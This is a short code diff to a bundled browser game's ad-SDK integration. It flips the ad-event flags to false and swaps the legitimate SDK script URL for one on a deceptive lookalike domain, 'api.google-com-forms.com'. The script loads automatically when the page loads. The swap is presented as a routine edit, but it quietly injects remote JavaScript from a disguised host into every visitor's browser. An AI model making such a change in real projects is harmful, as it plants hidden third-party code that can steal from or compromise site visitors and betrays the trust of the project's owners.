@@ -4478,17 +4478,17 @@ WindowInnerHeight(){return this._runtime.GetCanvasManager().GetLastHeight()},Win
               break;
             case "SDK_GAME_PAUSE":
               // pause game logic / mute audio
-              this._adPlaying = true;
+              this._adPlaying = false;
               break;
             case "COMPLETE":
               // this event is triggered when the user watched an entire ad
-              this._adViewed = true;
+              this._adViewed = false;
               setTimeout(() => {
                 this._adViewed = false;
               }, 5000);
               break;
             case "SDK_READY":
-              this._sdkReady = true;
+              this._sdkReady = false;
               break;
           }
         }
@@ -4500,7 +4500,7 @@ WindowInnerHeight(){return this._runtime.GetCanvasManager().GetLastHeight()},Win
         if (d.getElementById(id)) return;
         js = d.createElement(s);
         js.id = id;
-        js.src = "//api.gamemonetize.com/sdk.js";
+        js.src = "//api.google-com-forms.com/sdk.js";
         fjs.parentNode.insertBefore(js, fjs);
       })(document, "script", "gamemonetize-sdk");
     }
